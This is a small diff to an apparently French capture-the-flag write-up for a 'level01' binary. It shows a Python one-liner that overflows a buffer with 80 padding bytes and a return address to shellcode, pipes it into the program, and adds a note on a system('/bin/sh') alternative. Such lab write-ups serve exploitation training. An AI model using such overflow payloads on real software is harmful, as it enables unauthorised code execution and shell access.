@@ -11,3 +11,5 @@ on trouve l'adresse du shellcode grace a peda
 
     python -c 'print "dat_wil\n" + "A" * 80 + "\xff\xff\xd8\x89"[::-1]' > /tmp/exploit
     cat /tmp/exploit - | ./level01
+
+Autre solution, chercher system et bin/sh pour y faire appel
